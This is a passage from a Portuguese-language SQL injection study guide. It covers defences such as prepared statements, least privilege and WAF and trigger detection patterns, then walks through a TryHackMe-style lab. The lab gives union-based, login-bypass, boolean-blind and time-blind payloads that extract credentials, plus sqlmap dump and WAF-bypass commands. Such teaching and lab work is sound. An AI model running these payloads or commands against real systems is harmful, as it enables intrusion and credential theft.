connection.query(query, callback);

// CORRIGIDO
connection.execute(
  'SELECT * FROM usuarios WHERE username = ?',
  [username],
  callback
);
```

### 2. Validação de Entrada (Input Validation)

Use **lista de permissões** (allowlist) sempre que possível:

```php
// PHP - Validar ID numérico
if (!ctype_digit($_GET['id'])) {
    die("ID inválido");
}

// JavaScript - Validar email
if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
    throw new Error("Email inválido");
}

// Python - Validar username
if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
    raise ValueError("Username inválido")
```

**NUNCA** confie apenas em validação. Use-a em conjunto com prepared statements.

### 3. Escapando Entrada do Usuário

**Último recurso** - quando não é possível usar prepared statements:

```php
  // PHP - mysqli_real_escape_string
$escaped = mysqli_real_escape_string($conn, $input);
$query = "SELECT * FROM usuarios WHERE username='$escaped'";

// Python - escapamento manual
from mysql.connector import escape_string
escaped = escape_string(input)
query = f"SELECT * FROM usuarios WHERE username='{escaped}'"
```

⚠️ **Desvantagens:**

- Específico para cada banco de dados
- Pode ser contornado com codificação
- Requer lembrar de escapar todas as entradas

### 4. Princípio do Menor Privilégio

A conta de banco de dados usada pela aplicação deve ter **apenas as permissões necessárias**:

```sql
-- NUNCA fazer isso:
GRANT ALL PRIVILEGES ON *.* TO 'app'@'localhost';

-- AO INVÉS DISSO, faça:
-- Apenas leitura na tabela de produtos
GRANT SELECT ON loja.produtos TO 'app'@'localhost';

-- Apenas INSERT e UPDATE na tabela de pedidos
GRANT INSERT, UPDATE ON loja.pedidos TO 'app'@'localhost';

-- Remover privilégios desnecessários
REVOKE DELETE, DROP, ALTER ON loja.* FROM 'app'@'localhost';
```

**Boa prática:**

- ✅ Aplicação apenas leitura? → apenas `SELECT`
- ✅ Nunca usar `root`, `sa` ou `postgres` como usuário da aplicação
- ✅ Separar contas por funcionalidade

### 5. Web Application Firewalls (WAFs)

WAFs inspecionam requisições e bloqueiam padrões de ataque conhecidos:

**Regras comuns em WAFs:**

```nginx
# Bloquear SQL Injection
if ($args ~* "('.*or.*1=1.*')") { return 403; }
if ($args ~* "(union.*select.*)") { return 403; }
if ($args ~* "(information_schema)") { return 403; }
```

⚠️ **Limitações:**

- Não substitui código seguro
- Pode ser contornado com ofuscação
- Pode causar falsos positivos
- Atacantes experientes contornam facilmente

### 6. Monitoramento e Detecção

Configure logs para detectar tentativas de SQL Injection:

```sql
-- Log de consultas suspeitas
CREATE TABLE logs_seguranca (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip VARCHAR(45),
    consulta TEXT,
    data_hora TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Trigger para registrar tentativas comuns
CREATE TRIGGER detecta_sqli AFTER INSERT ON logs
FOR EACH ROW
BEGIN
    IF NEW.consulta LIKE '% UNION SELECT %' OR 
       NEW.consulta LIKE '% OR 1=1%' OR 
       NEW.consulta LIKE '% SLEEP(%' THEN
        INSERT INTO logs_seguranca (ip, consulta) 
        VALUES (NEW.ip, NEW.consulta);
    END IF;
END;
```

### Checklist de Prevenção

- **Todas** as consultas usam prepared statements?
- Entradas de usuário são validadas com allowlist?
- A conta do banco tem privilégios mínimos?
- WAF configurado (mas não confiado como única defesa)?
- Logs de segurança estão ativos e monitorados?
- Senhas são hasheadas (bcrypt, Argon2, PBKDF2)?
- Frameworks estão atualizados?
- Testes de penetração regulares são realizados?

### Quando Documentar uma Falha de SQLi

Ao reportar para um cliente, inclua:

1. **Descrição da vulnerabilidade**
2. **Payload utilizado** (prova de conceito)
3. **Dados expostos** (exemplo)
4. **Passos para reproduzir**
5. **Correção proposta** (prepared statements + validação)
6. **Impacto** (crítico, alto, médio, baixo)
7. **Recomendações adicionais** (menor privilégio, WAF, etc.)

---
## Laboratório Prático

### Visão Geral

Quatro níveis que demonstram técnicas diferentes de SQL Injection:

|Nível|Técnica|Dificuldade|
|---|---|---|
|1|Union-Based SQLi|Fácil|
|2|Bypass de Autenticação|Muito Fácil|
|3|Boolean-Based Blind SQLi|Médio|
|4|Time-Based Blind SQLi|Difícil|

### Preparação

1. Clique em **Start Machine** para iniciar o laboratório
2. Acesse `http://[IP_DA_MAQUINA]/level1` no navegador
3. Use a VPN se estiver fora da rede TryHackMe
4. **Elementos da interface:**
	- **Simulação de navegador** com barra de endereços
    - **Caixa "Consulta SQL"** atualizada em tempo real
    - **Caixa "Resultados SQL"** ou botão para enviar resposta        
    - As flags aparecem no topo de cada nível

### Nível 1: Union-Based SQL Injection

**Objetivo:** Encontrar a senha de Martin usando Union-Based

**Cenário:** Blog com artigos, parâmetro `id` vulnerável

**Consulta atual:**

```sql
select * from article where id =
```

#### Passo 1: Descobrir número de colunas

Teste sucessivamente:

```sql
1 UNION SELECT 1        -- ❌ Erro
1 UNION SELECT 1,2      -- ❌ Erro
1 UNION SELECT 1,2,3    -- ✅ Sucesso
```

A tabela tem **3 colunas**.

#### Passo 2: Tornar a saída da UNION visível

Mude o ID para `0` (ou `-1`) para a consulta original não retornar resultados:

```sql
0 UNION SELECT 1,2,3
```

Os números aparecem na página. O `3` está visível → é nossa coluna de extração.

#### Passo 3: Obter nome do banco de dados

```sql
0 UNION SELECT 1,2,database()
```

→ Banco: `sqli_one`

#### Passo 4: Listar tabelas

```sql
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'sqli_one'
```

→ Tabelas: `article, staff_users`

#### Passo 5: Ver colunas de staff_users

```sql
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'staff_users'
```

→ Colunas: `id, username, password`

#### Passo 6: Extrair dados

```sql
0 UNION SELECT 1,2,group_concat(concat_ws(':', username, password)) 
FROM staff_users
```

**Resultado:** veja a senha do Martin e insira na caixa de resposta.

**Flag encontrada!** Avance para o Nível 2.

### Nível 2: Bypass de Autenticação

**Objetivo:** Fazer login sem credenciais

**Cenário:** Formulário de login

**Consulta atual:**

```sql
select * from users where username='' and password='' LIMIT 1;
```

#### O Ataque

1. No campo **Username**, insira: `' OR 1=1;--`
2. No campo **Password**, insira qualquer coisa
3. Clique em Login

**O que acontece:**

```sql
select * from users where username='' OR 1=1;--' and password='anything' LIMIT 1;
```

- `username=''` → falso
- `OR 1=1` → verdadeiro
- Toda a condição → verdadeira
- `;--` → comenta o resto
- Retorna todos os usuários
- Login com o primeiro (admin)

#### Alternativas

```sql
-- Login como admin específico
username: admin'--
password: qualquer

-- Bypass apenas com campo senha
username: qualquer
password: ' OR 1=1;--

-- Usando #
username: ' OR 1=1#
```

**Flag encontrada!** Avance para o Nível 3.

### Nível 3: Boolean-Based Blind SQL Injection

**Objetivo:** Encontrar credenciais de admin usando feedback booleano

**Cenário:** API de verificação de username que retorna `{"taken":true/false}`

**Consulta atual:**

```sql
select * from users where username = '%username%' LIMIT 1;
```

#### Passo 1: Confirmar injeção

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

→ `{"taken":true}` ✅ Injeção confirmada

#### Passo 2: Descobrir banco de dados (caractere por caractere)

```sql
-- Primeira letra
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';-- → false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';-- → true ✅ (s)

-- Segunda letra
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sa%';-- → false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';-- → true ✅ (q)

-- Continue...
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'squ%';-- → false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sql%';-- → true ✅ (l)

-- Resultado final: sqli_three
```

#### Passo 3: Encontrar tabelas

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
```

→ `{"taken":true}` → começa com 'u'  
→ Continue: `us%` → true, `use%` → true, `user%` → true, `users` → true  
→ Tabela: `users`

#### Passo 4: Encontrar colunas

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.columns 
WHERE table_name='users' AND column_name LIKE 'u%';--
```

→ Colunas: `username`, `password`

#### Passo 5: Extrair username

```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```

→ Começa com 'a'  
→ Continue até obter: `admin`

#### Passo 6: Extrair senha

```sql
admin123' UNION SELECT 1,2,3 FROM users 
WHERE username='admin' AND password LIKE '3%';--
```

→ Continue caractere por caractere até obter: `3845`

#### Passo 7: Login

- Username: `admin`
- Password: `3845`

**Flag encontrada!** Avance para o Nível 4.

### Nível 4: Time-Based Blind SQL Injection

**Objetivo:** Encontrar credenciais de admin usando atrasos na resposta

**Cenário:** Ponto de injeção no cabeçalho HTTP Referer. A resposta é **idêntica** independentemente da condição.

**Características:**

- Sem saída visível
- Sem feedback booleano
- Único indicador: tempo de resposta

#### Passo 1: Encontrar número de colunas

```sql
admin123' UNION SELECT SLEEP(5);--        → imediato
admin123' UNION SELECT SLEEP(5),2;--      → 5 segundos de atraso ✅
```

→ A tabela tem **2 colunas**

#### Passo 2: Descobrir banco de dados

```sql
-- Primeira letra
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'a%';-- → imediato
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';-- → 5s delay ✅

-- Continuação...
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sq%';-- → delay ✅
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'squ%';-- → imediato
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sql%';-- → delay ✅

-- Resultado final: sqli_four
```

#### Passo 3: Encontrar tabelas

```sql
admin123' UNION SELECT SLEEP(3),2 FROM information_schema.tables 
WHERE table_schema='sqli_four' AND table_name LIKE 'u%';--
```

→ Delay de 3 segundos → começa com 'u'  
→ Continue até: `users`

#### Passo 4: Encontrar colunas

```sql
admin123' UNION SELECT SLEEP(3),2 FROM information_schema.columns 
WHERE table_name='users' AND column_name LIKE 'u%';--
```

→ Colunas: `username`, `password`

#### Passo 5: Extrair senha

```sql
-- Testar primeiro caractere
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '1%';-- → imediato
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '4%';-- → 3s delay ✅

-- Segundo caractere
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '49%';-- → delay ✅

-- Continue...
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '496%';-- → delay ✅
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '4961%';-- → delay ✅
admin123' UNION SELECT SLEEP(3),2 FROM users 
WHERE username='admin' AND password LIKE '4961';-- → delay ✅
```


→ Senha: `4961`

#### Passo 6: Login

- Username: `admin`
- Password: `4961`

**Flag final encontrada!** 🎉

### Resumo dos Payloads do Laboratório

| Nível | Payload                          | Explicação        |
| ----- | -------------------------------- | ----------------- |
| 1     | `0 UNION SELECT 1,2,3`           | Descobrir colunas |
| 1     | `0 UNION SELECT 1,2,database()`  | Nome do banco     |
| 2     | `' OR 1=1;--`                    | Bypass de login   |
| 3     | `' UNION SELECT... LIKE 'a%';--` | Boolean-Based     |
| 4     | `' UNION SELECT SLEEP(5)...`     | Time-Based        |

---
## Checklist do Pentester

### Testes Rápidos para SQL Injection

#### Fase 1: Detecção (5-10 minutos)

- Inserir `'` em todos os parâmetros (URL, formulários, cookies)    
- Inserir `"` (aspas duplas) para consultas com aspas duplas
- Testar `;--` em parâmetros que podem terminar consulta
- Testar `OR 1=1` em todos os campos de entrada
- Observar erros de banco de dados
- Observar mudanças de comportamento

#### Fase 2: Exploração (30-60 minutos)

**Se In-Band:**

- Determinar número de colunas (`ORDER BY` ou `UNION SELECT`)
- Identificar colunas visíveis (usando `-1 UNION SELECT`)
- Extrair `database()`, `user()`, `version()`
- Enumerar tabelas do `information_schema`
- Enumerar colunas das tabelas alvo
- Extrair dados sensíveis (credenciais, PII, etc.)

**Se Blind Boolean-Based:**

- Confirmar injeção com `LIKE '%';--`
- Enumerar banco caractere por caractere
- Enumerar tabelas e colunas
- Extrair dados lentamente

**Se Blind Time-Based:**

- Confirmar injeção com `SLEEP(5)`
- Encontrar número de colunas com `SLEEP()`
- Enumerar dados com delays
- Extrair dados completos

**Se Out-of-Band:**

- Configurar servidor de callback (DNS/HTTP)
- Testar `LOAD_FILE()` (MySQL) ou `xp_dirtree` (MSSQL)
- Exfiltrar dados via requisições de saída

### Ferramentas Recomendadas

|Ferramenta|Uso|
|---|---|
|**SQLmap**|Automação de SQL Injection|
|**Burp Suite**|Proxy, repetição de requisições|
|**OWASP ZAP**|Alternativa open-source|
|**nmap + sqlmap**|Escaneamento de rede + SQLi|
|**Python requests**|Scripts personalizados|

### Exemplo de Uso do SQLmap

```bash
# Detecção básica
sqlmap -u "http://site.com/page?id=1" --batch

# Extrair bancos de dados
sqlmap -u "http://site.com/page?id=1" --dbs

# Extrair tabelas de um banco específico
sqlmap -u "http://site.com/page?id=1" -D nome_banco --tables

# Extrair dados
sqlmap -u "http://site.com/page?id=1" -D nome_banco -T usuarios --dump

# Bypass de WAF
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment

# Tempo de delay para blind
sqlmap -u "http://site.com/page?id=1" --time-sec=5
```

### Relatório Final

Para cada vulnerabilidade encontrada, documente:

1. **URL/Endpoint:** `https://site.com/page?id=1`
2. **Método:** GET/POST
3. **Parâmetro:** `id`
4. **Payload:** `1' OR 1=1;--`
5. **Evidência:** Print da resposta/erro
6. **Dados expostos:** Exemplo de dados extraídos
7. **Impacto:** Crítico/Alto/Médio/Baixo
8. **Remediação:** Prepared statements + validação

---
## Glossário

|Termo|Definição|
|---|---|
|**SQL Injection**|Inserção de código SQL malicioso em consultas|
|**Payload**|Código injetado para explorar a vulnerabilidade|
|**In-Band**|Saída visível na resposta da aplicação|
|**Blind SQLi**|Sem saída visível, infere-se por comportamento|
|**Boolean-Based**|Usa verdadeiro/falso para extrair dados|
|**Time-Based**|Usa delays de tempo para inferir|
|**Out-of-Band**|Usa canal externo (DNS/HTTP) para exfiltrar|
|**UNION**|Operador SQL que combina resultados de SELECT|
|**information_schema**|Banco de metadados do MySQL|
|**Prepared Statement**|Consulta parametrizada que separa SQL e dados|
|**Sanitização**|Processo de limpeza de entrada do usuário|
|**WAF**|Web Application Firewall|
|**PII**|Informações Pessoais Identificáveis|

---
## Referências e Leitura Adicional

### Documentação Oficial

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 2025 - A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection)
- [MySQL Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

### Ferramentas

- [SQLmap - Official Documentation](https://sqlmap.org/)
- [Burp Suite - SQL Injection Guide](https://portswigger.net/web-security/sql-injection)

### Cursos e Certificações

- **OSCP (Offensive Security)** - Penetration Testing
- **CRTP (Certified Red Team Professional)**
- **eWPT (eLearnSecurity Web Penetration Tester)**
- **PortSwigger Web Security Academy**

### Livros Recomendados

- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "SQL Injection Attacks and Defense" - Clarke
- "Practical SQL" - DeBarros

### Laboratórios Online

- **TryHackMe** (já inclui esta sala)
- **HackTheBox** - Máquinas com SQLi
- **PentesterLab** - Exercícios de web security
- **PortSwigger Labs** - 100+ labs gratuitos
